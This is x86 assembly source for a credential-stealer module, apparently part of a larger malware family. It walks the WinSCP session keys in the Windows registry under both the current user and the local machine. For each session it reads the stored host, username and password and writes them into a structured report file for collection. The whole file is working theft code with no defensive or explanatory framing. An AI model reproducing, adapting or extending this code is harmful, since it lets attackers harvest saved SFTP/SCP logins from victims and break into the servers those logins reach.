.data?
      scpBuf1       db  100h dup (?)
      scpBuf2       db  100h dup (?)
      bscpBuf1      db  100h dup (?)
      bscpBuf2      db  100h dup (?)
      scpPwd        db  200h dup (?)
      scpHost       db  100h dup (?)
      scpUser       db  100h dup (?)
      
.code

GetWinSCPPwd proc
      LOCAL   WTF:DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], WINSCP_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetscpPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      push    HKEY_CURRENT_USER
      call    GetscpBefore
      
      push    HKEY_LOCAL_MACHINE
      call    GetscpBefore
      
    GetscpPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetWinSCPPwd endp

GetscpBefore proc basekey:DWORD
      LOCAL   bscpKey :DWORD
      LOCAL   bindex :DWORD
      LOCAL   bscpbufsize :DWORD
      
      lea     eax, bscpKey
      push    eax
      push    KEY_READ
      push    0
      push    offset scp_regpath1
      push    dword ptr [basekey]
      call    dword ptr [_RegOpenKeyEx]
      test    eax, eax
      jne     bscp_failed_1
      
      mov     dword ptr [bindex], 0

    scp_enum_loop:
      mov     bscpbufsize, sizeof bscpBuf1
      xor     eax, eax
      push    eax
      push    eax
      push    eax
      push    eax
      lea     eax, bscpbufsize
      push    eax
      push    offset bscpBuf1
      push    dword ptr [bindex]
      push    dword ptr [bscpKey]
      call    dword ptr [_RegEnumKeyEx]
      cmp     eax, ERROR_NO_MORE_ITEMS
      je      ball_scp_key_done
      inc     dword ptr [bindex]
      
      lstrcpy, addr bscpBuf2, addr scp_regpath1
      lstrcat, addr bscpBuf2, addr sl
      lstrcat, addr bscpBuf2, addr bscpBuf1
      lstrcat, addr bscpBuf2, addr scp_regpath2
      
      push    offset bscpBuf2
      push    dword ptr [basekey]
      call    Getscp
      
    bscp_failed_2:
      jmp     scp_enum_loop

    ball_scp_key_done:
      push    dword ptr [bscpKey]
      call    dword ptr [_RegCloseKey]
    bscp_failed_1:
      
      ret
GetscpBefore endp

Getscp proc basekey:DWORD, path:DWORD
      LOCAL   scpKey :DWORD
      LOCAL   index :DWORD
      LOCAL   scpbufsize :DWORD
      
      lea     eax, scpKey
      push    eax
      push    KEY_READ
      push    0
      push    dword ptr [path]
      push    basekey
      call    dword ptr [_RegOpenKeyEx]
      test    eax, eax
      jne     scp_failed_1
      
      mov     dword ptr [index], 0

scp_enum_loop:
      mov     scpbufsize, sizeof scpBuf1
      xor     eax, eax
      push    eax
      push    eax
      push    eax
      push    eax
      lea     eax, scpbufsize
      push    eax
      push    offset scpBuf1
      push    dword ptr [index]
      push    dword ptr [scpKey]
      call    dword ptr [_RegEnumKeyEx]
      cmp     eax, ERROR_NO_MORE_ITEMS
      je      all_scp_key_done
      inc     dword ptr [index]
      
      lstrcpy, addr scpBuf2, path
      lstrcat, addr scpBuf2, addr sl
      lstrcat, addr scpBuf2, addr scpBuf1
      
      ; Get Host
      mov     byte ptr [scpHost], 0
      invoke  RegRead, basekey, addr scpBuf2, addr scp_reg2, addr scpHost, sizeof scpHost, REG_READ_A
      test    eax, eax
      je      scp_failed_2
      ; Get UserName
      mov     byte ptr [scpUser], 0
      invoke  RegRead, basekey, addr scpBuf2, addr scp_reg3, addr scpUser, sizeof scpUser, REG_READ_A
      test    eax, eax
      je      scp_failed_2
      ; Get Pwd
      mov     byte ptr [scpPwd], 0
      invoke  RegRead, basekey, addr scpBuf2, addr scp_reg4, addr scpPwd, sizeof scpPwd, REG_READ_A
      test    eax, eax
      je      scp_failed_2
      
      lstrlen, addr scpHost
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_HOST
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr scpHost, plen, addr SNW, NULL
      
      lstrlen, addr scpUser
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_LOGIN
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr scpUser, plen, addr SNW, NULL
      
      lstrlen, addr scpPwd
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr scpPwd, plen, addr SNW, NULL
      
    scp_failed_2:
      jmp     scp_enum_loop

    all_scp_key_done:
      push    dword ptr [scpKey]
      call    dword ptr [_RegCloseKey]
    scp_failed_1:
      ret
Getscp endp
